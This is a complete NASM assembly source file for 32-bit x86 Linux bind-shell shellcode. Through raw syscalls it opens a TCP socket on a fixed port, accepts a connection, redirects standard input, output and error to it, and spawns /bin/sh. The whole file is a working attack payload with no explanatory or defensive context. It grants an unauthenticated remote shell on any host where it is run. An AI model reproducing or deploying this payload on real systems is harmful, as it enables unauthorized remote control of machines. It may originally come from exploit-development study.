; bindshell.nasm

global _start

section .text

_start:

    ; // 1. Create socket

    push 0x66
    pop eax

    push 0x1
    pop ebx

    xor ecx, ecx
    push ecx
    push ebx
    push 0x2
    mov ecx, esp
    int 0x80
    mov esi, eax

    ; // 2. Bind socket

    mov al, 0x66

    pop ebx

    xor edx, edx
    push edx
    push word 0xba13
    push bx
    mov ecx, esp

    push 0x10
    push ecx
    push esi
    mov ecx, esp
    int 0x80

    ; // 3. Set socket into passive listening mode

    push eax
    push esi
    mov ecx, esp
    add ebx, 0x2
    mov al, 0x66
    int 0x80

    ; // 4. Handle incoming connection

    push eax
    push eax
    push esi
    mov ecx, esp
    inc ebx
    mov al, 0x66
    int 0x80

    ; // 5. Duplicate stdin, stdout and stderr file descriptors

    xchg ebx, eax

    push 0x2
    pop ecx

    loop:

        mov al, 0x3f
        int 0x80
        dec ecx
        jns loop

    ; // 6. Spawn shell

    push edx
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp
    inc ecx

    mov al, 0xb
    int 0x80
